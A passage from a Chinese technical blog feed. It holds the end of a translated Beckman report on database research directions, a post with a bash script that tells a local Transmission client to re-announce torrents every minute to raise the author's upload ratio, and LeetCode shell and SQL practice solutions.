<h2 id="指标和基准">指标和基准</h2><p>可扩展性不应该仅仅用数据的容量和每秒查询次数来度量。还应该以数据处理方的总体消耗（包括管理和能耗），端到端的处理速度（从原始数据获取到最终知识的输出），系统的稳定性（可以容忍部分数据的解析错误）和可用度（尤其对于入门用户来说）。为了度量这么多的指标，需要提出新的基准测试。</p>
<h1 id="数据管理中的多样性">数据管理中的多样性</h1><h2 id="不存在通解">不存在通解</h2><p>在今天，和传统的企业数据相比数据的种类、形式和规模都多种多样，形成了这个数据驱动的世界，传统的数据储存在为分析专门优化过的数据仓库中。现在数据通常以不同的表示形势，以不同的应用程序接口、查询工具提供出来。这样看来，不太可能一个大型的数据系统可以符合所有这些灵活性的要求。我们期望看到不同类别的系统涌现，每一个类别都解决一个专门的需求（比如数据去重、大型图数据分析、多种科学实验，实时流处理），或是发觉一个特定的硬件平台（比如廉价机器的集群或是超多核心的服务器）。为了解决这些问题，需要并行计算和高效地处理数据量大于内容容量数据集的专业知识。</p>
<h2 id="跨平台集成">跨平台集成</h2><p>给定系统的多样性，平台需要被集成或是联合起来，为跨系统分析数据提供可能。这和让数据的格式透明化相关，更和跨数据系统间的数据访问和数据流动的性能优化相关。这也要求管理系统需要跨设备和数据中心运行。在网络连接不稳定的情况下，设备离线的情况逐渐地变得常见，这就带来了可信数据的输入，查询处理和数据不一致的挑战。</p>
<h2 id="编程模型">编程模型</h2><p><strong>一个多样、数据驱动的世界需要多样的编程抽象，方便开发者在大型数据集上进行操作。</strong>一个面向大数据的数据分析语言，比如一个SQL的超集并不能满足所有人的需求。更进一步，用户必须用他们最熟悉的语言来进行数据的分析：SQL，Pig，R，Python，领域特定的语言或是一个低级别的限制性编程模型，例如MapReduce，或是Valiant的批量同步处理模型。同样建议开发可重用的可以多种语言绑定的中间件，比如可伸缩的矩阵计算库、数组操作、程式化地迭代执行模型等。另一个可能成果丰硕的方向在于，为新领域的数据分析开发领域特定的分析语言，并直接将这种可扩展、并行处理的思想结合在其中。</p>
<h2 id="数据处理流程">数据处理流程</h2><p>为了应对数据的多样性，我们需要平台可以处理“生”和“熟”的数据。被处理过的“熟”数据可以是很多种形态：表格、矩阵或是图。系统会运行端到端的工作流，其中多种类型的数据被混合处理，比如说，通过SQL查询出的数据接着使用R进行分析。为了统一不同的系统，懒计算有时有一定的优势————懒数据解析、懒转换、懒加载、懒索引和创建视图，及时（JIT）查询计划。大数据系统应该变得更加可互操作，就像是Lego积木一般。<br>集群资源管理器，比如Hadoop2.0的YARN，在系统层面提供了一些灵感，Hadoop生态圈的工作流系统和科学工作流的工具也给了我们一些启示。</p>
<h1 id="端到端的数据处理">端到端的数据处理</h1><p>数据库研究团体需要给予端到端的数据处理更多的关注。在多年研究的成果中，我们很少看到能不在人进行关键性干涉的情况下，从原始数据逐步提取到知识的工具。对于大多数步骤来说，干涉的人需要对计算机有深入的了解。</p>
<h2 id="数据到知识处理管线">数据到知识处理管线</h2><p>原始数据到知识管线基本就是如下步骤：数据获取、选取、评估、清洗和变换（也被称为“数据扯皮”）、抽取和整合、挖掘、联机分析、结果总结、证明和解释。除了更大的规模外，其他显著变化的包括了数据和用户的多样性。现在，数据以各种形式出现，通常非结构化和结构化会以结构化的形式结合起来用。在分析管线的每一步中，数据工具必须利用人类的反馈，并且必须是相关领域的专家，而不是IT专业人员。例如，一个记者想要从一个记录有罪犯数据的表格中清晰、统计和发布数据。工具也必须为新出现的数据科学家团体量身定做。</p>
<h2 id="工具的多样性">工具的多样性</h2><p>既然没有一个全能的工具可以应对所有的数据分析场景，我们需要多种工具，每个都需要一个原始数据到知识的处理管线。它们必须可以被无缝地衔接起来，可以被入门菜鸟和专家使用。每个工具提供最佳实践来给予使用者充分的指导。</p>
<h2 id="工具的可定制性">工具的可定制性</h2><p>工具必须可以利用相关的领域知识，比如字典、知识库和规则。它们应该可以很轻易地进行领域的定制，有可能通过机器学习来自动化这一定制化过程。人工编辑的规则的地位依然很高，但是由于很多分析应用需要极高的精确度，例如电子商务。对于这些应用，分析师经常要写规则来覆盖一些边缘个例，着对于学习和泛化就不可行。所以，工具必须为编辑、评估、应用和管理人工规则提供支持。</p>
<h2 id="开源">开源</h2><p>在此领域内很少有工具是开源的。大多数都需要较高的授权费用，并只针对数据处理步骤中的特定步骤。这样造成的后果是，现有的工具不能直接从数据研究团体方面获得贡献。</p>
<h2 id="理解数据">理解数据</h2><p>解释、证明、过滤、总结和可视化是让分析工具更好用的几个关键点。捕获并且管理恰当的元信息是让解释、出处、重用和可视化成为可能的一个关键点。可视化分析逐渐获得了数据库、可视化和人机交互领域研究人员的关注。在本领域持续的研究成果对于应对大容量数据的用户十分重要。</p>
<h2 id="知识库">知识库</h2><p>我们对于一个目标领域获知的知识越多，工具越能好地分析这个领域。结果是，为了获得更好的理解数据，创建、分享和使用领域知识蒸逐渐地流行起来。这样的知识通常被储存在知识库之中，其中描述了一个领域中非常多重要的概念和关系，比如一个知识库存储了数十万的生物学研究人员和他们发表的研究成果、隶属关系和专利。这样的知识库被用来提高数据到知识管线的准确性，回答领域内的一些问题，并找寻相关的领域专家。很多公司已经构建了这样的知识库来回答用户的查询、对文本进行标注和支持电子商务，分析社交网络数据。知识库是比较准确的，这导致了一些社区维护的“知识中心”的发展，它们提供了查询、分享的工具，并使用知识库进行数据分析。</p>
<p>在此话题已经不断有工作进展的基础上，我们需要更多的精力被投入一下工作上，提供工具帮助不同能力层次的用户协同地构建、维护、查询和分享领域内专业知识的知识库。</p>
<h1 id="云服务">云服务</h1><p>云计算目前大致可以分为三类：</p>
<ul>
<li>IaaS，服务就是虚拟化后的硬件</li>
<li>PaaS，服务是虚拟化后的基础设施软件，例如DBMS</li>
<li>SaaS，服务就是一个应用软件服务，比如一个CRM解决方案</li>
</ul>
<p>从一个数据平台的角度来看，PaaS是最理想的。用户可以上传数据到云上，和传统数据库一样通过SQL进行查询，并选择性地分享数据和查询结果。这一切都不需要考虑需要租多少个机器实例，使用什么操作系统，如何在多机器间分表和怎样进行数据库调优。虽然一些类似的服务已经出现了，比如Salesforce的Database.com，Google的Big Query，Amazon的Redshift和Microsoft的Azure SQL Database。我们还没有达到最理想的服务。如下，我们列出了一些关键的挑战来实现数据Paas的愿景。</p>
<h2 id="可伸缩性">可伸缩性</h2><p>数据的迁移代价非常高。NAS让数据库引擎可以轻易地进行扩展，但是网络延时和带宽限制着数据库的性能。SAS降低了这些限制，但是服务器宕机将会造成服务可用性降级，最终影响SLAs。</p>
<p>一个公开的问题是是否云存储服务可以支持事务和分析，缓存怎样才能被最好地嵌入整个系统中还是不太明确。为了提供伸缩性，数据PaaS的数据库引擎和分析平台需要可以正常地运行，即使是在底层资源可能随时由于业务需要进行扩容的情况下。对于付费的优质用户，提供优先级更高的服务。</p>
<h2 id="数据冗余复制">数据冗余复制</h2><p>对于地理位置分散的数据中心，其相互之间的延时让数据的备份并保持一致性、高吞吐和低响应时间有了很大难度。多主数据备份是一个不错的选择，这是由于在不同复制副本上发生冲突的更新可以被自动同步。不过这个编程模型对于主流的编程人员来说不太直观。所以，主要挑战在于如何最优地权衡可用性、一致性、编程复杂度和代价。</p>
<h2 id="系统管理和调优">系统管理和调优</h2><p>对于Data PaaS来说，不存在数据库和系统管理员这两个角色。所以，管理工作必须被自动化，比如容量估计，资源供给和物理数据管理。资源管理参数也需要以极高的响应度被自动计算出，例如缓冲池大小和权限管理。</p>
<h2 id="多“租户”">多“租户”</h2><p>一个数据PaaS的竞争力来自其价格要比内部部署的解决方案低。这就需要提供商将多个用户的需求打包运行在相同的硬件资源上，通过分享来减少开销。首先，数据得在用户之间被隔离防止数据泄露。这可以通过将用户的数据库分散在不同的文件中，或是通过虚拟机进行隔离。不过，这对规模小的数据库非常不经济，并且想在多个VM之间均衡分配资源也是困难的。其他解决方案可以是用户分享一个数据库和数据库引擎，但需要特殊地身份限制保证安全。第二，用户想要定义了性能和可用性的SLA，提供商也希望SLA来提供分级分价格的服务，不过，怎样定义SLA让客户易于理解，让服务商易于实现是一个挑战。实现的困难在于保证客户之间的性能分离，即一个客户突发的高访问量不会导致另一个客户的服务被降级影响到。</p>
<h2 id="数据分享">数据分享</h2><p>云计算让分享达到了从未有过的高度。一个问题是如何支持入数据管理等核心功能的云上合作。还有其他问题包括：怎样找到有用的公开数据，怎样将私有管理的数据和公开数据相关联，怎样在网上找到优质的数据，怎样以细粒度做数据分享，怎样在分享数据和计算的同时分担开支，怎样给数据定价。云计算页造成了新的数据什么周期问题，比如在云服务提供商发生故障的时候应该怎么做，怎样在使用者和提供者完全没有关联的情况下，持久保存数据。云计算也会驱动数据管理方面的工具创新，比如审计、法律条文的健全。</p>
<h2 id="混合云">混合云</h2><p>将在线数据服务、自部署的服务和移动设备结合的需求是存在的。其中的一个使用场景就是工作负载分流。比如在一般情况下，用户可能在他们的私有云中运行应用，不过可能在流量峰值到来的时候使用公有云进行负载分流。还有一个例子是物联网，例如车辆会将本地的传感器数据聚集后上传其中一些到云平台中，并且基于从多方聚集的数据获得控制信息。物联网系统与从多个传感器和移动设备获取的信息流有关，并且必须应对间断性的网路传输和有限的电池资源，这对于实时造成了挑战，并且页可能让云端的数据管理成为了一个关键任务。</p>
<h1 id="人在数据生命周期中的职责">人在数据生命周期中的职责</h1><p>回到企业驱动的数据管理时代，人员的职责非常的明确：</p>
<ul>
<li>开发者开发数据库和以数据库为和谐的应用</li>
<li>商业分析师使用（基于SQL的）报表工具，查询数据库</li>
<li>终端用户产生数据，查询或是更新数据库</li>
<li>数据库管理员对数据库和工作流进行监测与调优</li>
</ul>
<p>现在，一个人可能将扮演数据生命周期中的多个角色，而有些角色可能需要众包来解决。所以，对于查询的理解和优化、判别相关和可信的数据源、定义和持续优化数据处理管线、可视化相关的特征模式、获得查询结果、将任务分解为大量小任务供专家或是用户来解决，人的因素需要被详细地考量。我们将人的角色分为四个大类：生产者、管理者、消费者和社区成员。</p>
<h2 id="数据生产者">数据生产者</h2><p>今天，基本上所有人都可以通过手机、社交平台、应用和可穿戴设备生成源源不断的信息流。对于数据库社区一个关键的挑战是设计算法和激励方式指导人们生产并分享最有用的数据，同时保证自己需要的隐私不泄露。当人们生产数据的时候，我们怎么帮助他们快而准确地添加元信息。比如说用户上传照片后，Facebook就会自动地将人脸区域都标注出来，这样用户就可以选择是否对人脸进行标注。另一个例子是一个自动帮推文加话题标签的工具。我们还能做什么类似的工作吗，或者我们还可以提供什么通用的原则和工具？</p>
<h2 id="数据管理者">数据管理者</h2><p>数据不再仅仅存在于数据库中，只被DBA或是被IT部门所掌控了。现在，很多人都有权利对数据进行管理。众包是其中的实现方法之一。这其中的一个关机挑战是基于一个不完美的人类数据管理者，获取到一个高质量的数据集合。<strong>我们需要构建允许用户轻松管理数据的平台，并扩展相关的应用来与管理者合作。</strong>对于这种以人为中心的挑战，数据源头和解释将成为一个重点，隐私与安全也同样重要。</p>
<h2 id="数据消费者">数据消费者</h2><p>人们总是提出诸多的数据使用方法和更加混乱的数据，这提出了很多挑战。在企业中，数据消费者通常了解如何针对一个结构化的表格写SQL查询。而现在数据消费者有可能不知道如果生成一个查询语句了，比如说一个希望在一个结构化数据集上找出“在佛罗里达有100,000人口以上所有城市的平均温度”的新闻工作者。如果想让人们自己找出这些问题的答案，就需要提供新的查询界面了，比如基于多点触摸的界面而不是传统的SQL。我们需要多种整合了可视化、查询和导航的界面。当用户的查询不明确的时候，需要提供给用户其他浏览、探索、可视化和挖掘数据的方法，让数据消费更加简单。</p>
<h2 id="在线社区">在线社区</h2><p>人们想要创建、分享和管理其他社群的数据。他们想合作构建社群对应的知识库、Wiki和处理数据的工具。比如说，很多研究人员在Google Scholar上面创建了自己的主页。<br>对于我们来说，挑战就是帮助社群构建数据挖掘、分享和探索的工具。</p>
<h1 id="社区带来的挑战">社区带来的挑战</h1><p>除了研究领域的挑战，数据库领域还面对着不少社区难题。这包含数据库教学、数据科学和研究文化。有一些是大数据带来的新难题，有一些则是被大数据加剧了的旧问题。</p>
<h2 id="数据库教学">数据库教学</h2><p>目前标准的数据库课程已经难以与现在的实际需要相衔接了。目前的教学内容集中植根在上世纪八十年代，那时内存相比于数据库的存储容量来说非常小，I/O就成了很多数据库操作的瓶颈，并且当时的服务器都配备相对较为昂贵的单核处理器。而现在，很多数据直接可以在内存中装下，多核处理器让并行和缓存行为成为了衡量数据库的一个标准。虽然基于SQL的数据管理系统被广泛使用，键值存储、数据流式处理和MapReduce框架也已经广泛普及。目前需要重新审视整个数据库教学计划。</p>
<h2 id="数据科学">数据科学</h2><p>如我们之前所谈到的，大数据需要数据科学家来辅助将大量的数据转换为可以使用的知识。数据科学家不仅仅需要数据管理的知识，也需要商业智能、计算机系统、数学、统计学、机器学习和优化相关的知识。新的跨专业学科项目需要集中这些专业知识。成功的研究和教学需要其他学科和领域专家的辅助。大数据给了计算机科学一个影响化学、地球科学、社会学和其他领域的机会。这些课程中计算机科学的一小部分可以让数据管理和科学扮演一个更加突出的位置。</p>
<h2 id="科研文化">科研文化</h2><p>目前一个现象是比起研究成果的影响，人们更加关注论文的引用数量。这就影响了大型项目、端到端工具和数据集分享的实施，因为这通常需要花费更多的时间。太注重偏门学科方向深挖而不注重实际影响的学科团体需要注意一下，发表论文的频率应该回归到更加合理范围，我们应该鼓励大型的系统项目、工具集和数据分享。</p>
<h1 id="向前推进">向前推进</h1><p>现在对于数据库研究人员来说真是个令人激动的时代。在以前，数据库研究都限制在企业需求和关系型数据库下。大数据的兴起和大数据驱动时间愿景带来了诸多的挑战：利用新硬件、软件和云平台的潜力；指出数据的生命周期，从数据的产生、分析到分享；面对数据的多样性、在大数据处理各个方面的人物的角色。现在也需要重新审视数据库的教育、数据消费者的演化和我们的价值体系。这对我们评估、传播和资助研究也有很重要的意义。</p>
<h1 id="致谢">致谢</h1><p>感谢审阅者给出的无价建议。Beckman会议是由Ram Kumar Memorial教授的基金会，微软公司和Walmart实验室赞助的</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>数据库研究者将大数据描绘为一个决定性的挑战。我们需要集中精力在五个研究热点上才能最大程度地利用现在众多的机会。</p>
<p>数据库的一小队核心研究人员通过周期性的例会，交流探讨领域内的发展状态，并指出未来的核心发展方向。例会已经成功举办了多届，比如1989,1990,19]]>
    </summary>
    
      <category term="beckman" scheme="http://yqf3139.github.io/tags/beckman/"/>
    
      <category term="database" scheme="http://yqf3139.github.io/tags/database/"/>
    
      <category term="trans" scheme="http://yqf3139.github.io/categories/trans/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[为了加快PT分享速度，自动督促Transmission获取更多Peers]]></title>
    <link href="http://yqf3139.github.io/2016/09/10/find-more-transmission-peers-to-boost-seeding-speed-automaticly/"/>
    <id>http://yqf3139.github.io/2016/09/10/find-more-transmission-peers-to-boost-seeding-speed-automaticly/</id>
    <published>2016-09-10T06:40:37.000Z</published>
    <updated>2016-09-10T07:53:17.872Z</updated>
    <content type="html"><![CDATA[<h1 id="为何要如此努力地增加PT分享率">为何要如此努力地增加PT分享率</h1><p>学校内连接外网的代价还是挺大的，更不要说在线串流电影或是下载了。虽然我没有追剧的压力，看电影的偏好也比较单一，PT的压力不会很大，不过加入北邮人PT后，使用的是全新的账号，由于怕分享率太低被封禁账号，还是需要在下载资源后，利用电脑的空闲资源，在电影看完被删掉前借此增加一点分享率。</p>
<p>理想情况是，电影下好后在观看过程中进行分享，如果一直有较好的上传速度的话，很快就可以流量回本了，无奈几次实验下来，几乎没有分享多少流量，导致分享率已经跌倒了0.1。</p>
<p>大概有这几点原因导致了我分享率很低：</p>
<ul>
<li>有些我想看的资源已经是冷门资源</li>
<li>我的网络环境太差，其他人从我这获取资源的速度太慢，导致我只能分享他下载流量的很小比例</li>
<li>我一般看完就删，分享时间非常有限</li>
<li>PT内网环境中，大家的下载速度都很快，并且有很多人分享，别人在不知道我这里有资源的情况下就已经下载完成了</li>
</ul>
<p>其中冷门资源想看只能使用其他资源的上传来补了；从我的下载速度可以稳定在10MB/s看来，网络环境不是瓶颈；我并不想囤积电影，看完就删的习惯不准备改变，也不准备话很长时间挂机分享；看来，针对免费的热门资源，如何提高自己的分享效率成为了比较好的方案。</p>
<h1 id="Transmission">Transmission</h1><p>Transmission是Linux上很不错的BT下载器，PT资源也支持，它还支持一个Web客户端，Web客户端使用Http与Transmission服务部通信，这就为我们自动话督促分享量提供了机会。</p>
<p>细看Transmission的一个任务，发现其中Peers通常是由Tracker来提供的，但这里显示Transmission每半个小时才会去询问一次有没有更多Peers，这边就带来了可能很多Peers需要下载我分享的资源时候，我并不知道这一情况，错失了很多上传机会。</p>
<p><img src="/images/find-more-transmission-peers-to-boost-seeding-speed-automaticly/transmission.png" alt="Transmission"></p>
<p>人工通过在任务上<code>右键</code>&gt;<code>Ask Tracker For More Peers</code>刷了几分钟后，发现上传速度能维持在一个不错的水平了。</p>
<h1 id="解决方案">解决方案</h1><p>其实就通过查看Web客户端是如何请求Transmission服务器，每隔一段时间强制刷新Peers列表就可以了。</p>
<h2 id="获取Web客户端与Transmission的通信规范">获取Web客户端与Transmission的通信规范</h2><p>首先通过<code>Transmission</code>&gt;<code>Preferences</code>&gt;<code>Remote</code>&gt;<code>Allow Remote Access</code>打开Web客户端。</p>
<p><img src="/images/find-more-transmission-peers-to-boost-seeding-speed-automaticly/web-client.png" alt="Webclient"></p>
<p>然后通过<code>Chrome Dev Tools</code>审查Web客户端和服务器的请求。</p>
<p><img src="/images/find-more-transmission-peers-to-boost-seeding-speed-automaticly/chrome-devtools.png" alt="ChromeDevTools"></p>
<p>分析请求发现<code>torrent-get</code>获取任务ID和详情信息，<code>torrent-reannounce</code>向Tracker发出刷新Peers列表的请求。</p>
<p>通过<code>Copy as cURL</code>直接复制Chrome发出的请求，方便进行实验。</p>
<h2 id="通过脚本自动化刷新Peers列表的过程">通过脚本自动化刷新Peers列表的过程</h2><p>最终整理Shell脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取Transmission的Session ID，不然后续请求无效</span></span><br><span class="line">TSID=`curl <span class="operator">-s</span>I <span class="string">'http://localhost:9091/transmission/rpc'</span> |grep -Fi <span class="string">"X-Transmission-Session-Id"</span> | tr <span class="operator">-d</span> <span class="string">'\r'</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$TSID</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前任务的ID列表，通过jq工具解析Json</span></span><br><span class="line">TDATA=`curl <span class="operator">-s</span> <span class="string">'http://localhost:9091/transmission/rpc'</span> -H <span class="string">'Origin: http://localhost:9091'</span> -H <span class="string">'Accept-Encoding: gzip, deflate'</span> -H <span class="string">'Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4'</span> -H <span class="string">"<span class="variable">$TSID</span>"</span> -H <span class="string">'Content-Type: json'</span> -H <span class="string">'Accept: application/json, text/javascript, */*; q=0.01'</span> -H <span class="string">'Referer: http://localhost:9091/transmission/web/'</span> -H <span class="string">'X-Requested-With: XMLHttpRequest'</span> -H <span class="string">'DNT: 1'</span> --data-binary <span class="string">'&#123;"method":"torrent-get","arguments":&#123;"fields":["id"],"ids":"recently-active"&#125;&#125;'</span> --compressed | jq -c <span class="string">'&#123;"method":"torrent-reannounce","arguments":&#123;ids: [.arguments.torrents[].id]&#125;&#125;'</span> | tr <span class="operator">-d</span> <span class="string">'\r'</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$TDATA</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发出刷新Peers列表的请求</span></span><br><span class="line">curl <span class="string">'http://localhost:9091/transmission/rpc'</span> -H <span class="string">'Origin: http://localhost:9091'</span> -H <span class="string">'Accept-Encoding: gzip, deflate'</span> -H <span class="string">'Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4'</span> -H <span class="string">"<span class="variable">$TSID</span>"</span> -H <span class="string">'Content-Type: json'</span> -H <span class="string">'Accept: application/json, text/javascript, */*; q=0.01'</span> -H <span class="string">'Referer: http://localhost:9091/transmission/web/'</span> -H <span class="string">'X-Requested-With: XMLHttpRequest'</span> -H <span class="string">'DNT: 1'</span> --data-binary <span class="string">"<span class="variable">$TDATA</span>"</span> --compressed</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每隔一分钟刷新一次</span></span><br><span class="line">sleep <span class="number">60</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>其中有一个坑在将一个命令的输出存入Shell变量时候，有时末尾会有’\r’这个字符，但echo这个变量又和不带’\r’的字符串看不出区别。如果不通过<code>tr -d &#39;\r&#39;</code>删除的话，curl发出的请求就不能被正常相应。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="为何要如此努力地增加PT分享率">为何要如此努力地增加PT分享率</h1><p>学校内连接外网的代价还是挺大的，更不要说在线串流电影或是下载了。虽然我没有追剧的压力，看电影的偏好也比较单一，PT的压力不会很大，不过加入北邮人PT后，使用的是全新的账号，由于怕分享率]]>
    </summary>
    
      <category term="PT" scheme="http://yqf3139.github.io/tags/PT/"/>
    
      <category term="shell" scheme="http://yqf3139.github.io/tags/shell/"/>
    
      <category term="transmission" scheme="http://yqf3139.github.io/tags/transmission/"/>
    
      <category term="tech" scheme="http://yqf3139.github.io/categories/tech/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一些来自LeetCode的Shell和Sql问题]]></title>
    <link href="http://yqf3139.github.io/2016/09/07/some-shell-and-sql-problems-from-leetcode/"/>
    <id>http://yqf3139.github.io/2016/09/07/some-shell-and-sql-problems-from-leetcode/</id>
    <published>2016-09-07T13:41:18.000Z</published>
    <updated>2016-09-07T15:28:38.166Z</updated>
    <content type="html"><![CDATA[<p>Shell和Sql都是日常工作中经常使用的工具，发现LeetCode还有一些<a href="https://leetcode.com/problemset/shell/" target="_blank" rel="external">Shell</a>和<a href="https://leetcode.com/problemset/database/" target="_blank" rel="external">Sql</a>问题，由于项目中写Shell和Sql不是很多，练习的时候有些题目还稍微遇到了一点困难，记录如下。</p>
<h1 id="Shell">Shell</h1><h2 id="192-_Word_Frequency"><a href="https://leetcode.com/problems/word-frequency/" target="_blank" rel="external">192. Word Frequency</a></h2><p>难度：<code>Medium</code><br>题目大意：</p>
<ul>
<li>写一个bash脚本计算<code>word.txt</code>文件中每个单词出现的频率</li>
<li>只存在小写字母单词表，单词只使用一个或是多个空格分割</li>
<li>输出频率时候按照降序排列，由于保证单词的频率相互不重复，不用考虑再使用字典序做二次排序</li>
</ul>
<p>示例输入：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">the</span> <span class="property">day</span> <span class="keyword">is</span> sunny <span class="keyword">the</span> <span class="keyword">the</span></span><br><span class="line"><span class="keyword">the</span> sunny <span class="keyword">is</span> <span class="keyword">is</span></span><br></pre></td></tr></table></figure></p>
<p>示例输出：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">the <span class="number">4</span></span><br><span class="line">is <span class="number">3</span></span><br><span class="line">sunny <span class="number">2</span></span><br><span class="line">day <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="使用sort/uniq计算频率">使用sort/uniq计算频率</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span> words.txt | tr -s ' ' '\<span class="keyword">n</span>' | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -r | awk '&#123; <span class="keyword">print</span> <span class="label">$2</span>, <span class="label">$1</span>  &#125;'</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>tr -s</strong> : 将空格替换为换行，其中<code>-s  --squeeze-repeats</code>指明将连续的空格视为一个空格</li>
<li><strong>sort</strong>  : 按照字典序排序，为统计频率做准备，因为uniq只能统计连续出现的单词</li>
<li><strong>uniq -c</strong> : 将排序后单词序列中连续出现的重复单词去重，<code>-c</code>将重复次数输出</li>
<li><strong>sort -r</strong> : 按照频率降序排列结果</li>
<li><strong>awk</strong> : 将输出结果的第一栏和第二栏调换输出</li>
</ul>
<h3 id="仅仅使用awk和sort">仅仅使用awk和sort</h3><p>awk功能非常强大。<br><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="comment">'&#123;for(i=1;i&lt;=NF;i++) a[$i]++&#125; END &#123;for(k in a) print k,a[k]&#125;' words.txt | sort -k2 -nr</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>awk的对于每一行生效的指令中，对于每一行的每一栏的单词，将他们统计到map中</li>
<li>awk最后指令，将单词与频率输出</li>
<li><strong>sort -k2 -nr</strong> : 使用第二栏的数据，进行降序排序</li>
</ul>
<h2 id="194-_Transpose_File"><a href="https://leetcode.com/problems/transpose-file/" target="_blank" rel="external">194. Transpose File</a></h2><p>难度：<code>Medium</code><br>题目大意：</p>
<ul>
<li>写一个bash脚本转置<code>file.txt</code>给出单词的矩阵</li>
<li>单词只使用一个空格分割</li>
</ul>
<p>示例输入：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name age</span><br><span class="line">alice <span class="number">21</span></span><br><span class="line">ryan <span class="number">30</span></span><br></pre></td></tr></table></figure></p>
<p>示例输出：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name alice ryan</span><br><span class="line">age <span class="number">21</span> <span class="number">30</span></span><br></pre></td></tr></table></figure></p>
<h3 id="awk">awk</h3><p>还是继续awk大法好，awk其实类似于一个文件处理的编程框架。<br>awk和sed使用好，比直接写shell和使用各种命令进行管道叠加要效率高并且可读性高。<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;</span><br><span class="line">    row=NR<span class="comment">;</span></span><br><span class="line">    col=NF<span class="comment">;</span></span><br><span class="line">    for(i=<span class="number">1</span><span class="comment">;i&lt;=NF;i++) a[NR, i]=$i;</span></span><br><span class="line">&#125;</span><br><span class="line">END &#123;</span><br><span class="line">    for(i=<span class="number">1</span><span class="comment">;i&lt;=col;i++) &#123;</span></span><br><span class="line">        printf(<span class="string">"%s"</span>, <span class="literal">a</span>[<span class="number">1</span>, i])<span class="comment">;</span></span><br><span class="line">        for(j=<span class="number">2</span><span class="comment">;j&lt;=row;j++)</span></span><br><span class="line">            printf(<span class="string">" %s"</span>, <span class="literal">a</span>[j, i])<span class="comment">;</span></span><br><span class="line">        print <span class="string">""</span><span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;' file.txt</span><br></pre></td></tr></table></figure></p>
<p>直接将单词矩阵存下来，然后转置输出。</p>
<h1 id="Sql">Sql</h1><h2 id="176-_Second_Highest_Salary"><a href="https://leetcode.com/problems/second-highest-salary/" target="_blank" rel="external">176. Second Highest Salary</a></h2><p>难度：<code>Easy</code><br>题目大意：</p>
<ul>
<li>从<code>Employee</code>表中选出第二高的薪水记录</li>
<li>如果不存在第二高的记录，返回<code>null</code></li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+----+</span>--------+</span><br><span class="line"><span class="header">| Id | Salary |</span><br><span class="line">+----+--------+</span></span><br><span class="line">| 1  | 100    |</span><br><span class="line">| 2  | 200    |</span><br><span class="line"><span class="header">| 3  | 300    |</span><br><span class="line">+----+--------+</span></span><br></pre></td></tr></table></figure>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ifnull(</span><br><span class="line">    (select <span class="keyword">distinct</span> <span class="type">Salary</span> <span class="keyword">from</span> <span class="type">Employee</span> order by <span class="type">Salary</span> desc limit <span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">, null) <span class="keyword">as</span> <span class="type">SecondHighestSalary</span></span><br></pre></td></tr></table></figure>
<p>使用<code>ifnull</code>函数进行记录是否为空的判断。</p>
<h2 id="178-_Rank_Scores"><a href="https://leetcode.com/problems/rank-scores/" target="_blank" rel="external">178. Rank Scores</a></h2><p>难度：<code>Medium</code><br>题目大意：</p>
<ul>
<li>用Sql来为分数分级，对于相同的分数，分为同一级，下一级和前一级别连续编号。</li>
</ul>
